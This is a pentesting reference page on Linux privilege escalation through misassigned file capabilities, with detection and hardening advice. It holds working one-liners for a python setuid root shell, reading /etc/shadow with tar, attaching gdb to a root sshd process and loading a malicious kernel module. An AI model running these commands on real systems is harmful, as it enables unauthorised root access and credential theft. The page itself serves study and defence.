---
title: Capabilities-driven privesc
slug: capabilities-privesc
---

> **TL;DR:** File capabilities set via `setcap` grant slices of root power to individual binaries; the wrong cap on an interpreter (python, perl, ruby) or text editor is a direct path to UID 0.

## What it is
Linux capabilities split root's monolithic power into ~40 named bits (see `capabilities(7)`). When a binary has file capabilities in its `security.capability` xattr, the kernel grants those bits to the process at exec without needing setuid. Misassigned caps on a flexible binary turn into trivial privilege escalation because the attacker controls what the binary does once started.

## Preconditions / where it applies
- Local shell on the target as an unprivileged user
- A binary on disk with file capabilities — typically discovered with `getcap -r / 2>/dev/null`
- The binary must be one whose behaviour the attacker can steer (interpreter, debugger, archiver, container tooling)

## Technique
Enumerate file capabilities and match against the danger list. The high-impact caps are `cap_setuid`, `cap_setgid`, `cap_dac_read_search`, `cap_dac_override`, `cap_sys_admin`, `cap_sys_ptrace`, `cap_sys_module`, `cap_chown`, `cap_fowner`, `cap_net_raw`.

```bash
getcap -r / 2>/dev/null
# /usr/bin/python3.10 = cap_setuid+ep
```

The `+ep` suffix means *effective + permitted* — the cap is active when the process starts. From there:

```bash
# cap_setuid on python → root shell
python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# cap_dac_read_search on tar → exfiltrate /etc/shadow
tar --to-stdout -cf - /etc/shadow

# cap_sys_ptrace → attach to a root process
gdb -p $(pgrep -u root sshd | head -1)

# cap_sys_module → load a malicious kernel module
insmod evil.ko
```

`cap_sys_admin` is "the new root" — it enables mount(), namespace operations, BPF in some configs, and a long tail of privileged syscalls. On a binary that lets you run shell or arbitrary code (e.g. an interpreter), it's game over.

GTFOBins documents the working invocation for most flagged interpreters under the "Capabilities" tab. Always check there first before improvising.

## Detection and defence
- Audit with `getcap -r /` during build; treat any unexpected hit as a critical finding
- Prefer setuid over capabilities only when capabilities are insufficient; prefer neither when possible (use a privileged helper accessed via a unix socket)
- Strip caps on package upgrades — they survive `cp` only with `--preserve=xattr`
- AuditD rule on `execve` of binaries with caps; EDR can tag processes whose `/proc/self/status` shows non-empty `CapEff`
- Drop `CAP_SYS_MODULE` and `CAP_SYS_PTRACE` via systemd's `CapabilityBoundingSet` for services

## References
- [GTFOBins — Capabilities](https://gtfobins.github.io/) — per-binary exploitation snippets
- [capabilities(7)](https://man7.org/linux/man-pages/man7/capabilities.7.html) — canonical kernel docs on the cap model
- [HackTricks — Linux Capabilities](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/linux-capabilities.html) — danger list and exploitation recipes

Related: [[linux-capabilities]], [[suid-sgid-binaries]], [[linux-privesc-vectors]].
